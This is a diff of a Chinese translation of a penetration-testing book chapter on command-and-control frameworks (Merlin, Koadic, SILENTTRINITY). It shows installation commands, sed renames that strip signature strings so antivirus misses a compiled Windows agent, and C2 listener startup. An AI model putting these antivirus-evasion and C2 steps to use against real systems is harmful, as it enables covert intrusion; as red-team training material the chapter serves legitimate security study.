@@ -1,6 +1,4 @@
-# 2
-
-命令与控制的回归
+# 命令与控制的回归
 
 ![](img/chapterart.png)
 
@@ -29,12 +27,12 @@ Merlin（[`github.com/Ne0nd0g/merlin/`](https://github.com/Ne0nd0g/merlin/)）�
 使用以下命令安装 Golang 和 Merlin：
 
 ```
-root@Lab:~/# **add-apt-repository ppa:longsleep/golang-backports**
-root@Lab:~/# **apt update && sudo apt install golang-go**
-root@Lab:~/# **go version**
+root@Lab:~/# add-apt-repository ppa:longsleep/golang-backports
+root@Lab:~/# apt update && sudo apt install golang-go
+root@Lab:~/# go version
 go version go1.13 linux/amd64
 
-root@Lab:~/# **git clone https://github.com/Ne0nd0g/merlin && cd merlin**
+root@Lab:~/# git clone https://github.com/Ne0nd0g/merlin && cd merlin
 ```
 
 Merlin 的真正创新之处在于它依赖 HTTP/2 与其后端服务器通信。与 HTTP/1.x 不同，HTTP/2 是一种二进制协议，支持许多提升性能的特性，比如流复用、服务器推送等等（有一个很好的免费资源详细讨论了 HTTP/2，地址是[`daniel.haxx.se/http2/http2-v1.12.pdf`](https://daniel.haxx.se/http2/http2-v1.12.pdf)）。即便一个安全设备捕获并解密了 C2 流量，它也可能无法解析压缩后的 HTTP/2 流量，最终只是将其原封不动地转发。
@@ -42,16 +40,16 @@ Merlin 的真正创新之处在于它依赖 HTTP/2 与其后端服务器通信�
 如果我们直接编译一个标准代理，它会立刻被任何常规的防病毒软件通过简单的字符串查找给识别出来，尤其是查找常见的显眼术语。因此我们需要做一些调整。我们会重命名像`ExecuteShell`这样的可疑函数，并删除原始包名`github.com/Ne0nd0g/merlin`的引用。我们将使用经典的`find`命令来查找包含这些字符串的源代码文件，并将其输出传递给`xargs`，后者会调用`sed`来替换这些可疑术语为任意单词：
 
 ```
-root@Lab:~/# **find . -name '*.go' -type f -print0 \**
+root@Lab:~/# find . -name '*.go' -type f -print0 \
 **| xargs -0 sed -i 's/ExecuteShell/MiniMice/g'**
 
-root@Lab:~/# **find . -name '*.go' -type f -print0 \**
+root@Lab:~/# find . -name '*.go' -type f -print0 \
 **| xargs -0 sed -i 's/executeShell/miniMice/g'**
 
-root@Lab:~/# **find . -name '*.go' -type f -print0 \**
+root@Lab:~/# find . -name '*.go' -type f -print0 \
 **| xargs -0 sed -i 's/\/Ne0nd0g\/merlin/\/mini\/heyho/g'**
 
-root@Lab:~/# **sed -i 's/\/Ne0nd0g\/merlin/\/mini\/heyho/g' go.mod**
+root@Lab:~/# sed -i 's/\/Ne0nd0g\/merlin/\/mini\/heyho/g' go.mod
 ```
 
 这种粗暴的字符串替换可以绕过 90%的防病毒解决方案，包括 Windows Defender。不断调整并将其与像 VirusTotal 这样的平台（[`www.virustotal.com/gui/`](https://www.virustotal.com/gui/)）进行测试，直到你通过所有测试。
@@ -59,8 +57,8 @@ root@Lab:~/# **sed -i 's/\/Ne0nd0g\/merlin/\/mini\/heyho/g' go.mod**
 现在让我们在*output*文件夹中编译一个代理，稍后我们会将其放到 Windows 测试机上：
 
 ```
-root@Lab:~/# **make agent-windows DIR="./output"**
-root@Lab:~/# **ls output/**
+root@Lab:~/# make agent-windows DIR="./output"
+root@Lab:~/# ls output/
 merlinAgent-Windows-x64.exe
 ```
 
@@ -69,7 +67,7 @@ merlinAgent-Windows-x64.exe
 我们通过`go run`命令启动 Merlin C2 服务器，并通过`-i 0.0.0.0`选项指示它监听所有网络接口：
 
 ```
-root@Lab:~/# **go run cmd/merlinserver/main.go -i 0.0.0.0 -p 8443 -psk\**
+root@Lab:~/# go run cmd/merlinserver/main.go -i 0.0.0.0 -p 8443 -psk\
 `strongPassphraseWhateverYouWant`
 
 [-] Starting h2 listener on 0.0.0.0:8443
@@ -107,14 +105,14 @@ Merlin 仍然是一个处于初期阶段的项目，因此你会遇到一些 bug
 Koadic 框架由 zerosum0x0 开发（[`github.com/zerosum0x0/koadic/`](https://github.com/zerosum0x0/koadic/)），自 DEF CON 25 发布以来，已获得广泛关注。Koadic 完全专注于 Windows 目标，但其主要卖点是它实现了各种时髦且巧妙的执行技巧：`regsvr32`（一个 Microsoft 工具，用于在 Windows 注册表中注册 DLL，以便其他程序调用；它可用于欺骗像*srcobj.dll*这样的 DLL 执行命令）、`mshta`（一个 Microsoft 工具，用于执行 HTML 应用程序或 HTA）、XSL 样式表等等。用以下命令安装 Koadic：
 
 ```
-root@Lab:~/# **git clone https://github.com/zerosum0x0/koadic.git**
-root@Lab:~/# **pip3 install -r requirements.txt**
+root@Lab:~/# git clone https://github.com/zerosum0x0/koadic.git
+root@Lab:~/# pip3 install -r requirements.txt
 ```
 
 然后使用以下命令启动它（我还包括了`help`输出的开始部分）：
 
 ```
-root@Lab:~/# **./koadic**
+root@Lab:~/# ./koadic
 
 (koadic: sta/js/mshta)$ **help**
     COMMAND     DESCRIPTION
@@ -185,9 +183,9 @@ Koadic 将目标机器称为“僵尸”。当我们在服务器上检查僵尸�
 
 ```
 # Terminal 1
-root@Lab:~/# **git clone https://github.com/byt3bl33d3r/SILENTTRINITY**
-root@Lab:~/# **cd SILENTTRINITY**
-root@Lab:ST/# **python3.7 -m pip install setuptools**
+root@Lab:~/# git clone https://github.com/byt3bl33d3r/SILENTTRINITY
+root@Lab:~/# cd SILENTTRINITY
+root@Lab:ST/# python3.7 -m pip install setuptools
 root@Lab:ST/# `python3.7 -m pip install -r requirements.txt`
 
 # Launch the team server
@@ -199,7 +197,7 @@ SILENTTRINITY 不是作为本地独立程序运行，而是启动一个监听在
 ```
 # Terminal 2
 
-root@Lab:~/# **python3.7 st.py wss://username:**`strongPasswordCantGuess`**@192.168.1.29:5000**
+root@Lab:~/# python3.7 st.py wss://username:`strongPasswordCantGuess`**@192.168.1.29:5000**
 [1] ST >>  **listeners**
 [1] ST (listeners)>> **use https**
 
